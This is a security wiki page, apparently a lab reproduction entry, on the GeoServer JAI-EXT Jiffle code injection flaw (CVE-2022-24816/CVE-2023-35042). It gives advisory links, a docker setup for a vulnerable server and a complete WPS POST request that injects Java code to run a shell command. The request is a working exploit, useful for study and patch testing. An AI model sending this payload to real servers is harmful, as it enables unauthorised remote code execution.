<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="内部使用">
    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/GeoServer/CVE-2022-24816/">
    <link rel="shortcut icon" href="../../../favicon.ico">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>GeoServer Remote Code Injection caused by JAI-EXT (CVE-2022-24816/CVE-2023-35042) - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "GeoServer Remote Code Injection caused by JAI-EXT (CVE-2022-24816/CVE-2023-35042)", url: "#_top", children: [
              {title: "Vulnerable Environment", url: "#vulnerable-environment" },
              {title: "Exploit", url: "#exploit" },
          ]},
        ];

    </script>
    <script src="../../../js/base.js"></script>
      <script src="../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="README.zh-cn/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="README.zh-cn/" class="btn btn-xs btn-link">
        GeoServer JAI-EXT 导致远程代码注入漏洞（CVE-2022-24816/CVE-2023-35042）
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../CVE-2021-40822/README.zh-cn/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../CVE-2021-40822/README.zh-cn/" class="btn btn-xs btn-link">
        GeoServer 未授权SSRF漏洞（CVE-2021-40822）
      </a>
    </div>
    
  </div>

    

    <h1 id="geoserver-remote-code-injection-caused-by-jai-ext-cve-2022-24816cve-2023-35042">GeoServer Remote Code Injection caused by JAI-EXT (CVE-2022-24816/CVE-2023-35042)<a class="headerlink" href="#geoserver-remote-code-injection-caused-by-jai-ext-cve-2022-24816cve-2023-35042" title="Permanent link">&para;</a></h1>
<p><a href="README.zh-cn/">中文版本(Chinese version)</a></p>
<p>GeoServer is an open-source software server written in Java that provides the ability to view, edit, and share geospatial data. It is designed to be a flexible, efficient solution for distributing geospatial data from a variety of sources such as Geographic Information System (GIS) databases, web-based data, and personal datasets.</p>
<p>GeoServer uses the Jiffle map algebra language provided by JAI-EXT, which allows efficiently execute map algebra over large images. A code injection vulnerability (CVE-2022-24816) has been found in JAI-EXT versions 1.2.21 and earlier, that allows a remote code execution to be performed by properly crafting a Jiffle invocation.</p>
<p>When this vulnerability affects GeoServer, it is also known as <a href="https://osgeo-org.atlassian.net/browse/GEOS-10458">CVE-2023-35042</a>. GeoServer versions 2.20.4, 2.19.6, and 2.18.6 and later have fixed this vulnerability by updating the JAI-EXT dependency.</p>
<p>References:</p>
<ul>
<li><a href="https://www.synacktiv.com/publications/exploiting-cve-2022-24816-a-code-injection-in-the-jt-jiffle-extension-of-geoserver">https://www.synacktiv.com/publications/exploiting-cve-2022-24816-a-code-injection-in-the-jt-jiffle-extension-of-geoserver</a></li>
<li><a href="https://github.com/geosolutions-it/jai-ext/security/advisories/GHSA-v92f-jx6p-73rx">https://github.com/geosolutions-it/jai-ext/security/advisories/GHSA-v92f-jx6p-73rx</a></li>
<li><a href="https://geoserver.org/vulnerability/2022/04/11/geoserver-2-jiffle-jndi-rce.html">https://geoserver.org/vulnerability/2022/04/11/geoserver-2-jiffle-jndi-rce.html</a></li>
<li><a href="https://osgeo-org.atlassian.net/browse/GEOS-10458">https://osgeo-org.atlassian.net/browse/GEOS-10458</a></li>
<li><a href="https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2022/CVE-2022-24816.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2022/CVE-2022-24816.yaml</a></li>
</ul>
<h2 id="vulnerable-environment">Vulnerable Environment<a class="headerlink" href="#vulnerable-environment" title="Permanent link">&para;</a></h2>
<p>Execute the following command to start a GeoServer 2.17.2 server:</p>
<div class="highlight"><pre><span></span><code>docker compose up -d
</code></pre></div>
<p>After the server is started, you can browse the default page of GeoServer at <code>http://your-ip:8080/geoserver</code>.</p>
<h2 id="exploit">Exploit<a class="headerlink" href="#exploit" title="Permanent link">&para;</a></h2>
<p>The vulnerability exists in the WMS endpoint. An attacker can execute arbitrary Java code by sending a specially crafted request to <code>/geoserver/wms</code>. The request should include a malicious Jiffle expression that will be evaluated by the server.</p>
<p>Send a request like this to exploit the vulnerability:</p>
<div class="highlight"><pre><span></span><code>POST /geoserver/wms HTTP/1.1
Host: localhost:8080
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Type: application/xml
Content-Length: 2191

&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;wps:Execute version=&quot;1.0.0&quot; service=&quot;WPS&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns=&quot;http://www.opengis.net/wps/1.0.0&quot; xmlns:wfs=&quot;http://www.opengis.net/wfs&quot; xmlns:wps=&quot;http://www.opengis.net/wps/1.0.0&quot; xmlns:ows=&quot;http://www.opengis.net/ows/1.1&quot; xmlns:gml=&quot;http://www.opengis.net/gml&quot; xmlns:ogc=&quot;http://www.opengis.net/ogc&quot; xmlns:wcs=&quot;http://www.opengis.net/wcs/1.1.1&quot; xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; xsi:schemaLocation=&quot;http://www.opengis.net/wps/1.0.0 http://schemas.opengis.net/wps/1.0.0/wpsAll.xsd&quot;&gt;
&lt;ows:Identifier&gt;ras:Jiffle&lt;/ows:Identifier&gt;
&lt;wps:DataInputs&gt;
    &lt;wps:Input&gt;
    &lt;ows:Identifier&gt;coverage&lt;/ows:Identifier&gt;
    &lt;wps:Data&gt;
        &lt;wps:ComplexData mimeType=&quot;application/arcgrid&quot;&gt;&lt;![CDATA[ncols 720 nrows 360 xllcorner -180 yllcorner -90 cellsize 0.5 NODATA_value -9999  316]]&gt;&lt;/wps:ComplexData&gt;
    &lt;/wps:Data&gt;
    &lt;/wps:Input&gt;
    &lt;wps:Input&gt;
    &lt;ows:Identifier&gt;script&lt;/ows:Identifier&gt;
    &lt;wps:Data&gt;
        &lt;wps:LiteralData&gt;dest = y() - (500); // */ public class Double {    public static double NaN = 0;  static { try {  java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec(&quot;id&quot;).getInputStream())); String line = null; String allLines = &quot; - &quot;; while ((line = reader.readLine()) != null) { allLines += line; } throw new RuntimeException(allLines);} catch (java.io.IOException e) {} }} /**&lt;/wps:LiteralData&gt;
    &lt;/wps:Data&gt;
    &lt;/wps:Input&gt;
    &lt;wps:Input&gt;
    &lt;ows:Identifier&gt;outputType&lt;/ows:Identifier&gt;
    &lt;wps:Data&gt;
        &lt;wps:LiteralData&gt;DOUBLE&lt;/wps:LiteralData&gt;
    &lt;/wps:Data&gt;
    &lt;/wps:Input&gt;
&lt;/wps:DataInputs&gt;
&lt;wps:ResponseForm&gt;
    &lt;wps:RawDataOutput mimeType=&quot;image/tiff&quot;&gt;
    &lt;ows:Identifier&gt;result&lt;/ows:Identifier&gt;
    &lt;/wps:RawDataOutput&gt;
&lt;/wps:ResponseForm&gt;
&lt;/wps:Execute&gt;
</code></pre></div>
<p>After sending this request, the malicious Java code embedded in the Jiffle script will be executed by the server. The command output will be captured and returned to the client within a <code>java.lang.ExceptionInInitializerError</code> message:</p>
<p><img alt="" src="1.png" /></p>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="README.zh-cn/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="README.zh-cn/" class="btn btn-xs btn-link">
        GeoServer JAI-EXT 导致远程代码注入漏洞（CVE-2022-24816/CVE-2023-35042）
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../CVE-2021-40822/README.zh-cn/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../CVE-2021-40822/README.zh-cn/" class="btn btn-xs btn-link">
        GeoServer 未授权SSRF漏洞（CVE-2021-40822）
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
</footer>

</body>
</html>